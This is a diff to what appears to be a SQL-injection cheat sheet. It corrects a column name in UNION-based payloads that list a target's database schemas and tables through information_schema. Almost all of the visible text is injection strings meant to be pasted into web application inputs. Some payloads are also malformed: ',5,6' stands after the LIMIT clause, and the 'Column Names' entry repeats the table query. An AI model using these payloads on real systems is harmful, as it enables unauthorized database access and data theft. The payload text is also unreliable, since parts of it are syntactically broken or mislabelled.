@@ -76,10 +76,10 @@ SELECT column_name FROM information_schema.columns WHERE table_name='usuarios' a
 -1' UniOn Select 1,2,3,schema_name FROM information_schema.schemata LIMIT 0,1 ,5,6
 
 ## Tables of a Database
--1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 0,1 ,5,6
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1 ,5,6
 
 ## Column Names
--1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table.schema = database() LIMIT 0,1 ,5,6
+-1' UniOn Select 1,2,3,table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1 ,5,6
 
 
 ````
